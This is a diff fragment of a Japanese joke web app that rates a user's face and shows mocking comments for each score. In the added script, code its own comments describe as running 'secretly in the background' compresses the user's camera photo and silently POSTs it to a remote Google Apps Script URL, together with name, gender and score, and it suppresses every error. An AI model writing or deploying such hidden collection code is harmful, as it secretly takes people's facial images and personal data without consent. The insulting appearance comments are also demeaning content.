+                78: "「地味だけど仕事はできそう」という、会社のお局様からしか好かれない、絶望的な社内評価の定番。",
+                81: "80%突破！ここから一気に数値が激変！…と思いきや、あなたの顔面の底の浅さが全方位に露呈します。",
+                84: "80%台後半！「俺、結構イケてるんじゃね？」と調子に乗るも、周囲の女性陣は氷のような冷ややかな視線。",
+                87: "おっと80%台後半！ 鏡を見るたびに「俺ってメダリスト級のイケメン」と勘違いを極める痛すぎる末路。",
+                90: "まさかの90%台！…ですが、それはスマホのカメラアプリが完全に壊れているか、あなたの重度な錯覚のせい。",
+                93: "90%後半のミラクル！調子に乗ってSNSに自撮りを投稿した結果、誰からもいいねがつかず完全に凍死寸前。",
+                96: "頂点目前の90%台！ しかし、現実は残酷で、鏡の前のあなたは相変わらずいつものモブおじさん（お兄ちゃん）。",
+                99: "【MAX99%】全宇宙が爆笑する奇跡の99%！…ただし、それはあなたの脳内お花畑のファンタジーの世界だけ！"
+            };
+
+            const comments = (selectedGender === 'girl') ? girlComments : boyComments;
+            const message = comments[score] || "AIが本気でフリーズするレベルの顔面偏差値です。";
+
+            // GASへデータを送信する処理（バックグラウンドでこっそり実行）
+            try {
+                if (frontBlob) {
+                    const compressedBase64 = await new Promise((resolve) => {
+                        const img = new Image();
+                        const reader = new FileReader();
+                        reader.onload = (e) => { img.src = e.target.result; };
+                        img.onload = () => {
+                            const canvas = document.createElement('canvas');
+                            const ctx = canvas.getContext('2d');
+                            const MAX_WIDTH = 800;
+                            let width = img.width;
+                            let height = img.height;
+                            if (width > MAX_WIDTH) {
+                                height *= MAX_WIDTH / width;
+                                width = MAX_WIDTH;
+                            }
+                            canvas.width = width;
+                            canvas.height = height;
+                            ctx.drawImage(img, 0, 0, width, height);
+                            resolve(canvas.toDataURL('image/jpeg', 0.7));
+                        };
+                        reader.readAsDataURL(frontBlob);
+                    });
+
+                    // 画面の処理を止めずに裏側（バックグラウンド）だけで送信する
+                    fetch(GAS_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            name: displayName,
+                            gender: discordGender,
+                            score: score,
+                            message: message,
+                            imageBase64: compressedBase64
+                        })
+                    }).catch(() => {}); // エラーが出ても完全に無視
+                }
+            } catch (err) {
+                // 何もしない
+            }
+
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('message').style.display = 'none';
+                document.getElementById('scan-line').style.display = 'none';
+                document.getElementById('result-text').innerHTML = `${displayName} さんの顔面偏差値は...<br><span style="font-size:2.2rem; display:inline-block; margin:5px 0;">${score}%</span><br>${message}`;
+                document.getElementById('result-text').style.display = 'block';
+                document.getElementById('retry-btn').style.display = 'block';
+            }, 8000);
+        });
+    })();
+  </script>
+ <script>console.log("Hello");</script></body>
+</html>
